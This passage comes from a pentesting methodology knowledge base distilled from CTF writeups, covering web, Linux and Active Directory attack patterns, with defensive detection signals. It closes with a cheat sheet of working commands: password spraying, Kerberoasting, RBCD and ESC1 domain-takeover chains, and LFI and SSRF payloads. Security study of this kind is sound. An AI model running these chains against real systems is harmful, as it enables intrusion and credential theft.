- Dolibarr 17.0.0 `<?PHP` uppercase tag (BoardLight)
- Node.js `eval()` on user input (Umbrella)
- Werkzeug/Flask — `{{...}}` template injection (not in sampled writeups but commonly)
- PowerShell parameters in `run` invocations (Airplane-style)

### 7.4 Path traversal
- LFI via `?page=` parameter (Airplane) — `?page=./../../../../etc/passwd`
- LFI to /proc enumeration (Airplane) — `/proc/self/environ`, `/proc/<pid>/cmdline`
- LFI to SUID binary exfiltration (Lookup) — copy `/usr/sbin/pwm` to web root, download, analyze

### 7.5 File upload
- Direct unrestricted PHP upload (Sequence — `finance.php` after admin login)
- elFinder command injection via filename (Lookup)
- Dolibarr CMS page content PHP injection (BoardLight)
- LFI to PHP file inclusion when path is reflected (sequence and similar)

### 7.6 SSRF
- Direct URL parameter (Extract) — `?url=http://attacker` confirms
- Internal port scan via SSRF: `?url=127.0.0.1:<port>` for each port
- Next.js middleware bypass with `x-middleware-subrequest: middleware` (CVE-2025-29927)
- Gopher protocol for HTTP request smuggling through SSRF
- 2FA bypass via PHP deserialization cookie (`O:9:"AuthToken":...`)

### 7.7 LFI / RFI
- Path traversal in `?page=` (Airplane)
- SUID binary exfiltration via LFI → reverse engineering (Lookup)
- Reading source code via LFI to find second-stage vulns (Extract: `file:/var/www/html/preview.php`)
- File wrapper bypass: `file:///` filtered, but `file:/` not (Extract)

### 7.8 Privilege escalation misconfigurations
- SUID binary calls `id` without full path → PATH hijack (Lookup)
- SUID custom binary with known CVE (BoardLight: SUID enlightenment, CVE-2022-37706)
- `sudo ruby /root/*.rb` with wildcard → path traversal (Airplane)
- GenericWrite on computer object by Authenticated Users → RBCD (Ledger, Operation Endgame)
- `AddAllowedToAct` on DC by user → RBCD (Forward)
- Kerberoastable service account with crackable password (Soupedecode 01)
- Constrained delegation with protocol transition (Proxy)
- ADCS ESC1/ESC7 misconfigurations (Ledger, Manager)

### 7.9 sudo weaknesses
- `(ALL) NOPASSWD: /usr/bin/look` (Lookup) — reads arbitrary files
- `(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb` (Airplane) — wildcard injection
- SUID `find` (Airplane) — GTFObins shell

### 7.10 Credential exposure
- AD user `description` field with literal "Please change it: <PWD>" (Ledger)
- AD `servicePrincipalName` accounts (Kerberoast)
- Backup file with old config in web root (Manager)
- Docker image history reveals ENV var secrets (Umbrella)
- `users.txt` on a SMB share (Soupedecode 01)
- KeePass database unlocked via Windows user account (Forward) — LaZagne confirms
- IT-Credentials-Backup.txt on SMB share (Proxy) — file with two credential pairs

### 7.11 Kerberos weaknesses
- AS-REP Roasting (DONT_REQ_PREAUTH) — tried, sometimes fails
- Kerberoasting — works as guest in some configurations
- Targeted Kerberoast via GenericWrite (ShutdownRepo)
- Constrained delegation abuse (S4U2Self/S4U2Proxy)
- RBCD with empty NTLM hash: `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089C0`
- Unconstrained delegation (rare in sampled writeups)

### 7.12 ADCS misconfigurations
- ESC1: EnrolleeSuppliesSubject + low-priv enrollment
- ESC7: CA officer role + SubCA template enabled
- ESC9: weak certificate-to-account mapping
- ESC13: issuance policy linking

### 7.13 Certificate-based impersonation
- Certipy request with `-upn <target-user>@<dom>` for ESC1
- Certipy auth with `-pfx` to recover NT hash
- Pass-the-hash with the recovered hash via wmiexec

### 7.14 Insecure service configurations
- gdbserver on `0.0.0.0` without auth (Airplane)
- Docker socket mounted in container (Sequence)
- Docker image with built-in vulnerable binary (BoardLight)
- IIS default page (multiple writeups) — but IIS still leaks via TLS cert (Ledger)
- PHP with weak deserialization cookies (Extract)
- Node.js with `eval()` on user input (Umbrella)
- SSH running on default port 22 (multiple)

---

## 8. Common Mistakes (in the author's experience and in CTF culture)

The author doesn't enumerate these explicitly, but they appear in their handling:

- **Trying every attack before checking basic things** — always try guest:"" and anonymous FTP first
- **Trusting tool output without confirmation** — always verify with a second tool (e.g. NetExec + Impacket)
- **Not following up on "weird" output** — when a port returns something unexpected (e.g. `6048` as "x11" in nmap), keep probing. The author specifically called out: "Unfortunately, a service and default script scan does not tell us what is behind 6048" — then used LFI to read `/proc/<pid>/cmdline` and found gdbserver
- **Stopping at first success** — the author always asks "what can this user do?" (BloodHound) and "what other users can I reach?" (password spray)
- **Ignoring certificate data** — TLS certs leak CA name, internal hostnames, organization (Ledger explicitly adds CA name to /etc/hosts)
- **Forgetting to upgrade the shell** — the author upgrades every shell to TTY before continuing
- **Skipping the empty password hash trick** — when guest is in play, the empty NTLM hash is `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089C0`. Use it when tools require a hash instead of a blank password
- **Forgetting `time-sync`** — Kerberos tickets are time-sensitive; `sudo ntpdate -s <dc>` before Certipy auth (Manager HTB)

---

## 9. Defensive Implications (what an attacker doing this looks like to defenders)

Based on the patterns the author uses repeatedly:

| Attack pattern | Detection signal |
|---|---|
| Guest/anonymous SMB enumeration | SMB session from non-domain IP without auth; Event 4624 type 3 with null session |
| RID brute force | Many Event 4625 with `STATUS_MORE_ENTRIES` in close succession |
| AS-REP / Kerberoast requests | Event 4769 with RC4-HMAC (etype 0x17) from single source; Event 4768 from unusual source |
| BloodHound collection | LSASS reads of high volume (Event 4662 / Event 5136 spikes); network SMB reads on `/31/0` and similar |
| GenericWrite / RBCD | Event 5136 on `msDS-AllowedToActOnBehalfOfOtherIdentity` from non-admin source |
| Certipy ESC1 request | Event 4886 (cert request) followed by 4887 (issue) with unusual SubjectAltName |
| Pass-the-Hash | Event 4624 type 3 with NTLMv2 from a source not previously seen for that account |
| SUID privesc (GTFObins) | Auditd syscall: `execve` of unusual binary with SUID bit; audit log of bash being copied |
| Container escape via mounted / | Auditd: writes to host paths from container PID |
| Docker socket abuse | Container process spawning `docker`; unusual child of container PID 1 |

The author implicitly teaches this defensive view by being predictable: an organization that monitors for these patterns catches 0xb0b-style chains early.

---

## 10. How to Apply This Methodology to a New Authorized Target

When the user provides a new target, the workflow should be:

1. **Verify authorization and scope** (out of scope for this repo, but always step 0).
2. **Open the target as if it were a new THM box** — apply the 5.1 recon loop without preconceptions.
3. **Map the host role first** (AD DC, IIS, Linux, MSSQL, Docker, etc.) — this drives every subsequent hypothesis.
4. **Try the highest-yield opening moves in order**:
   - Open ports → identify role
   - guest:"" / anonymous on every service
   - Default credentials on any web login
   - Subdomain fuzzing if a domain is found
5. **Each credential goes into BloodHound** (if AD) or into the attack chain (if Linux/web).
6. **Document dead ends explicitly** — the author does this in every writeup; testers should too.
7. **Hypothesize before enumerating** — "this SUID binary calls `id` relative" → test that, not random things.
8. **Verify each step** — the author never claims success without showing the output (cracked hash + login test + share list + flag retrieval).
9. **Chain findings, don't pursue branches indefinitely** — when a path forward is clear, take it; when stuck, broaden the recon.
10. **Document both intended and unintended paths** — the unintended path is often the realistic one in real engagements.

---

## 11. Source-Attributed Specifics

To honor the prompt's request to distinguish source-specific knowledge from general knowledge:

- **Source-specific to 0xb0b writeups**:
  - The exact sequence "rustscan -b 500 -a <ip> --top -- -sC -sV -Pn" as the default first command
  - The habit of running `--generate-hosts-file hosts` after every nxc smb auth
  - The "intentional vs. unintended path" documentation pattern (Ledger, Operation Endgame)
  - The exact shell upgrade sequence (python3 pty spawn → Ctrl+Z → stty raw -echo → fg)
  - The use of Penelope as an alternative shell handler
  - The preference for `nxc` (NetExec) over `crackmapexec`
  - The use of BinaryNinja for SUID binary analysis (Lookup)
  - The CVE-2025-29927 exploit details (Extract)

- **General security knowledge (not source-specific but observed in the writeups)**:
  - Kerberoasting / AS-REP Roasting mechanics
  - S4U2Self / S4U2Proxy Kerberos delegation
  - GTFObins / LOLBAS / HackTricks references
  - Privilege escalation via PATH hijack
  - The empty NTLM hash `31d6cfe0d16ae931b73c59d7e0c089c0`
  - Certipy ESC1-ESC15 enumeration

---

## 12. Quick-Reference Cheat Sheet (for use during a new engagement)

```bash
# Initial recon
rustscan -b 500 -a <ip> --top -- -sC -sV -Pn

# AD DC identified — start with anonymous
nxc smb <ip> -u guest -p '' --shares
nxc smb <ip> -u guest -p '' --rid
nxc smb <ip> -u guest -p '' --generate-hosts-file hosts
ldapsearch -x -H ldap://<ip> -b "dc=<dom>,dc=<tld>" > ldap.out

# Once you have users
nxc smb <ip> -u users.txt -p '' --asreproast asrep.out
nxc ldap <ip> -u <user> -p <pw> --kerberoasting kerb.out
nxc smb <ip> -u users.txt -p users.txt --no-brute --continue-on-success  # username=password
kerbrute passwordspray -d <dom> --dc <ip> users.txt <pw>                  # password spray

# Crack
hashcat -a0 -m18200 asrep.out /usr/share/wordlists/rockyou.txt --show   # AS-REP
hashcat -a0 -m13100 kerb.out /usr/share/wordlists/rockyou.txt --show    # Kerberoast
hashcat -a0 -m  5600 ntlmv2.out /usr/share/wordlists/rockyou.txt --show # NTLMv2

# BloodHound
bloodhound-ce.py --zip -c All -d <dom> -u <user> -p <pw> -dc <dc> -ns <ip>

# RBCD chain
impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' \
  -computer-pass 'Pwned123@!' -dc-host <dc> -domain-netbios <dom> \
  '<dom>/<user>:<pw>'
rbcd.py -dc-ip <ip> -delegate-from 'ATTACKERSYSTEM$' -delegate-to '<DC>$' \
  -action 'write' '<dom>/<user>:<pw>'
getST.py -spn 'cifs/<dc>.<dom>' -impersonate 'Administrator' \
  '<dom>/ATTACKERSYSTEM$:Pwned123@!'
export KRB5CCNAME=Administrator@cifs_<dc>.<dom>@<DOM>.ccache
smbexec.py -k -no-pass <dom>/Administrator@<dc>.<dom>
secretsdump.py -k -no-pass <dom>/Administrator@<dc>.<dom>

# ESC1 chain
certipy-ad find -u <user>@<dom> -p <pw> -dc-ip <ip> -vulnerable
certipy-ad req -username <user> -password <pw> -ca '<ca>' \
  -target <ca-host>.<dom> -template <vuln> -upn <target>@<dom>
certipy-ad auth -pfx <target>*.pfx -dc-ip <ip>
impacket-wmiexec -hashes :<nt-hash> <dom>/<target>@<host>.<dom>

# Linux privesc quick reference
# After getting shell: upload + run LinPEAS, then check:
sudo -l
find / -perm -4000 2>/dev/null
ls -la /etc/cron* /var/spool/cron/
cat /etc/passwd   # find users with bash
ss -tlnp          # open ports
mount | grep host # host mounts

# LFI / SSRF
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?url=http://127.0.0.1:8080/   # SSRF
?url=gopher://127.0.0.1:80/_GET%20/...  # SSRF → RCE
```

---

*End of knowledge base. Distilled from 11 sampled writeups: 5 AD-focused, 4 Linux/web-focused, 1 HTB, 1 recon/forensics. Patterns observed in additional writeups not deeply sampled (Hammer, Padelify, Decryptify, etc.) align with the patterns documented here.*
